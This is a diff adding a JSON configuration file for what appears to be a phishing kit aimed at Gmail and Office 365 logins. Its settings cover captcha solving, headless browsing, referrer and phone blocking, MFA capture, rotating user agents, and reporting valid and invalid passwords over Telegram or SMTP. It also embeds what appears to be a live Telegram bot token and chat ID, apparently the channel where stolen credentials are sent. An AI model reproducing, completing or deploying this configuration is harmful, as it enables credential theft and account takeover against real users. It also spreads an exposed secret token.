@@ -1,0 +1,57 @@
+{
+   "key": "0101010101010010010101",
+   "captchaAPIKey": "",
+   "captchaAPIID":"2captcha",
+   "port": 3000,
+
+   "debugMode": true,
+   "sessionTimeout": 180000,
+   "headless": true,
+  
+   "strictAutograb": false,
+   "allowedRefera": ["No referrer"],
+   "reportInvalidPwd": true,
+   "reportInvalidEm": true,
+   "blockPhone": false,
+   "rateLimit": 10,
+
+   "useDir": false,
+   "useCaptchaSolver": false,
+   "userAgents": [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.107.36 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.106 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.105 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.104 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.103 Safari/537.36"
+
+   ],
+     
+   "smtp": false,
+   "telegram": true,
+   "url": false,
+
+   "smtp_host": null,
+   "smtp_port": 587,
+   "smtp_email": null,
+   "smtp_from_email": null,
+   "smtp_passwd": null,
+   "report_email": null,
+   "msg_subject": "The Report",
+
+   "purl": "",
+   
+   "botToken": "7216591184:AAGeSDHm087W-TPUrfIe9BhqUnZDg94XqIQ",
+   "chatId": "7030493392",
+
+   "useProxy":false,
+   "ProxyServa": "",
+   "ProxyUser": "",
+   "ProxyPwd": "",
+   "ProxyVisitorLocation": true,
+
+   "addMfa": true,
+   "LocalLoadGmail": true,
+   "LocalLoadO365": true
+}
+
